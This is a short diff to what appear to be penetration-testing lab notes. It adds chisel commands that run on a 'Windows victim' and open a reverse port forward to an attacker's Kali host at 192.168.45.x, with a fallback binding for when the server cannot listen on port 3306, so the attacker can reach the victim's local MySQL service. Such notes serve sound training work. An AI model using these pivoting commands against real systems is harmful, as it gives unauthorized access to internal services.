@@ -2778,6 +2778,9 @@ On the Windows victim, create the reverse port forward:
 
 ```powershell
 .\chisel.exe client 192.168.45.195:8000 R:3306:127.0.0.1:3306
+# If connection error: Server cannot listen on R:3306
+.\chisel.exe client 192.168.45.175:8000 R:127.0.0.1:8888:127.0.0.1:1234
+# Then connect on kali to 127.0.0.1:8888
 ```
 
 From Kali, connect to the victim’s local MySQL service through your local port `3306`:
